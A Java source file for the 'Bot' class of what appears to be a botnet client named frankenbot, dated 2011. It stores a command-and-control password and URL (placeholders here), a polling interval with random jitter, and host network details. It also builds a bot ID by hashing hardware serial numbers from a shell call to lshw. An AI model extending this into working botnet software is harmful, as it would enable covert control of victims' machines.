package ca.franky.frankenbot_bot;

import java.net.InetAddress;

/**
 * A class that hold the key characteristics of our bot, including
 * the bot status, the unique ID, its sleep cycle, etc.
 *
 * @author Francois Begin 2011
 */
public class Bot {

    // Current status of the bot
    String status;
    // The initial password to authenticate to C&C
    String ccInitialPwd;
    // The initial C&C URL
    String ccInitialURL;
    // How often in seconds to poll the C&C for instructions
    int sleepCycle;
    // Randomness in sleep cycle
    int sleepCycleRandomness;
    // This bot's unique ID
    String id;
    // This bot's public IP address
    InetAddress publicIP;
    // Various network parameters related to this host
    HostNetParams hostNetParams;

    /**
     * Our main constructor
     */
    public Bot() {
        status = "init";
        ccInitialPwd = "password";
        ccInitialURL = "url";
        sleepCycle = 10;
        sleepCycleRandomness = 5;
        id = "";
        publicIP = null;
        hostNetParams = new HostNetParams();
    }

    /**
     * Method that generate a unique bot id using a hash of the
     * host hardware information. Currently only implemented on Linux
     */
    public void generateBotID(){
        HostDetails myHost = new HostDetails();
        String hwData = "";
        if (myHost.osName.toUpperCase().equals("LINUX")) {
            hwData = Tools
                    .runCmd("lshw | grep -e serial -e product | " +
                            "grep -v Controller | grep -v None");
        }
        id = Tools.computeMD5(hwData);
    }
}
